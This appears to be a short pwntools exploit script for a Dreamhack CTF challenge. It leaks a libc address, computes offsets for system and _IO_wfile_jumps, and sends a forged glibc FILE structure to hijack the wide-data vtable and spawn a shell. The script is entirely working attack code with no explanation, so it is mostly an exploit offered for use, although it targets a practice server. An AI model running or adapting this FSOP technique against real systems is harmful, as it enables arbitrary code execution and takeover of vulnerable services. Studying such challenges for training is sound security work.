from pwn import *

context.arch = 'amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 16142
r = remote(HOST, PORT)

stdout=int(r.recvline().strip().decode(),16)
libc=stdout-0x21a780
system=libc+0x50d60
_IO_wfile_jumps=libc+0x2160c0
valid_lock=libc+0x21bab8-0x48

'''
markers = system
lock = valid_lock
wide_data = stdout-0x10
mode = 0xffffffff
unused2 = p32(0)+p64(0)+p64(stdout-8)
vtable = _IO_wfile_jumps-0x20 
'''

fs = flat({
    0x0: b'\x01\x01\x01\x01;sh\x00',
    0x60: system,
    0x88: valid_lock,
    0xa0: stdout-0x10,
    0xc0: p32(0xffffffff),
    0xc4: p32(0) + p64(0) + p64(stdout-8),
    0xd8: _IO_wfile_jumps - 0x20
},filler=b'\x00')
r.send(fs)

r.interactive()